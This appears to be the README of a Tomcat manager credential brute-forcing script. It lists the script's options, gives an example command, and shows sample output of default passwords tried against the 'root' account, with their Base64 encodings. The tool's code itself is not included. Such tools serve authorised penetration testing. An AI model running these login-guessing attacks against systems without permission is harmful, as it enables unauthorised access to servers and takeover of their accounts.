A script that can be used to bruteforce the tomcat manager login page.

# Usage

Tomcat Manager or Host-Manager Credential Bruteforcing

options:

-h, --help                              show this help message and exit
-U URL, --url URL                       Base URL to the Tomcat page (e.g., http://target.com)
-P PATH, --path PATH                    Manager or host-manager URI (e.g., /host-manager/html)
-u USERNAMES, --usernames USERNAMES     Path to file containing usernames
-p PASSWORDS, --passwords PASSWORDS     Path to file containing passwords
-v, --verbose                           Enable verbose output to see attempted credentials and encoded values
-r RATE_LIMIT, --rate-limit RATE_LIMIT  Delay in seconds between requests (e.g., 0.5 for half a second)
                        
# Example

python3 tomforce.py -U https://example.com -P /host-manager -u usernames.txt -p passwords.txt -v

[\+] Starting Brute-force Attack...                                                                        
[\*] Trying root:123456 → Encoded: cm9vdDoxMjM0NTY= → HTTP 401                                                                
[\*] Trying root:admin → Encoded: cm9vdDphZG1pbg== → HTTP 401                                                                 
[\*] Trying root:12345678 → Encoded: cm9vdDoxMjM0NTY3OA== → HTTP 401                                                          
[\*] Trying root:123456789 → Encoded: cm9vdDoxMjM0NTY3ODk= → HTTP 401                                                         
[\*] Trying root:1234 → Encoded: cm9vdDoxMjM0 → HTTP 401                                                                      
[\*] Trying root:12345 → Encoded: cm9vdDoxMjM0NQ== → HTTP 401                                                                 
[\*] Trying root:password → Encoded: cm9vdDpwYXNzd29yZA== → HTTP 401                                                          
[\*] Trying root:123 → Encoded: cm9vdDoxMjM= → HTTP 401                                                                       
[\*] Trying root:Aa123456 → Encoded: cm9vdDpBYTEyMzQ1Ng== → HTTP 401                                                          
[\*] Trying root:1234567890 → Encoded: cm9vdDoxMjM0NTY3ODkw → HTTP 401                                                        
[\*] Trying root:UNKNOWN → Encoded: cm9vdDpVTktOT1dO → HTTP 401                                                               
[\*] Trying root:1234567 → Encoded: cm9vdDoxMjM0NTY3 → HTTP 401                                                               
[\*] Trying root:123123 → Encoded: cm9vdDoxMjMxMjM= → HTTP 401                                                                
[\*] Trying root:111111 → Encoded: cm9vdDoxMTExMTE= → HTTP 401                                                                
[\*] Trying root:Password → Encoded: cm9vdDpQYXNzd29yZA== → HTTP 401
